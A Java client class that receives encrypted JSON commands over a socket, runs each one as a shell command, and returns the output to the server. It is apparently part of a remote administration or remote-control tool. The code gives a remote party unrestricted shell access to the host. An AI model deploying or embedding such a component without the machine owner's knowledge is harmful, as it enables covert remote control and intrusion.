package com.clientapp.service.implement;

import com.clientapp.enums.RequestType;
import com.clientapp.model.CommandModel;
import com.clientapp.socket.ClientSocket;
import com.clientapp.service.IClientCommand;
import com.google.gson.Gson;

import java.text.SimpleDateFormat;
import java.util.Date;

import static com.clientapp.util.implement.ShellCommandExecutor.executeShellCommand;

public class ClientCommand implements IClientCommand {
    private Boolean isRunning = true;

    public ClientCommand() {
    }

    @Override
    public void start() {
        try {
            System.out.println("Connected Successfully");
            Gson gson = new Gson();

            // Receive commands from the server
            System.out.println("Waiting for command...");
            while (isRunning) {
                String jsonCommand = ClientSocket.getInstance().receiveDecryptedMessage().trim();
                try {
                    CommandModel commandModel = null;
                    try {
                        // Deserialize JSON CommandModel
                        commandModel = gson.fromJson(jsonCommand, CommandModel.class);
                    }
                    catch (Exception e) {
                        System.err.println("Failed to parse command JSON: " + e.getMessage());
                        e.printStackTrace();
                        continue;
                    }

                    if (commandModel != null) {
                        if (commandModel.type == RequestType.EXIT_COMMNAD_SCREEN) {
                            stop();
                            break;
                        }

                        if (!commandModel.message.trim().isEmpty()) {
                            System.out.println("Received command: " + commandModel.message);

                            // Execute the shell command
                            String result = executeShellCommand(commandModel.message);

                            // Create response CommandModel
                            CommandModel response = new CommandModel();
                            response.time = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(new Date());
                            response.message = result;

                            // Send JSON response back
                            ClientSocket.getInstance().sendEncryptedMessage(gson.toJson(response));
                        }
                    }
                } catch (Exception e) {
                    System.err.println("Failed to parse command JSON: " + e.getMessage());
                    e.printStackTrace();
                }
            }
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
    }


    @Override
    public void stop() {
        isRunning = false;
        ClientSocket.getInstance().sendExitCommand();
        System.out.println("Exit Client Command");
    }
}
